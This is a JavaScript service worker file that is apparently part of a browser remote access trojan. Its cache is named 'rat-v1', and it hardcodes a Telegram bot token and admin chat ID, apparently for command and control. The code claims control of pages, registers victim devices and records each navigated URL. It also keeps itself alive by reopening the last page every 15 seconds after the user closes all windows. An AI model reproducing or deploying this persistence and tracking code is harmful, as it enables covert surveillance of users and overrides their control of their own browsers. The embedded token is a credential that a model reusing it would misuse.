// sw.js
const CACHE_NAME = 'rat-v1';
const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
const ADMIN_CHAT_ID = '8737104261';

let clientsMap = new Map();

self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});

self.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'CLIENT_READY') {
        clientsMap.set(event.source.id, event.data.deviceId);
        event.source.postMessage({ type: 'ACK' });
    } else if (event.data && event.data.type === 'PING') {
        event.source.postMessage({ type: 'PONG' });
    }
});

// Periodically check if any client is still alive; if all closed, reopen one
setInterval(async () => {
    const allClients = await clients.matchAll();
    if (allClients.length === 0) {
        // No open page – try to reopen the last known URL
        const lastUrl = await getLastUrl();
        if (lastUrl) {
            await clients.openWindow(lastUrl);
        }
    }
}, 15000);

async function getLastUrl() {
    const cache = await caches.open(CACHE_NAME);
    const response = await cache.match('/last-url');
    if (response) {
        return response.text();
    }
    return null;
}

async function saveLastUrl(url) {
    const cache = await caches.open(CACHE_NAME);
    await cache.put('/last-url', new Response(url));
}

// Track page navigations via fetch interception (optional)
self.addEventListener('fetch', (event) => {
    if (event.request.mode === 'navigate') {
        saveLastUrl(event.request.url);
    }
});
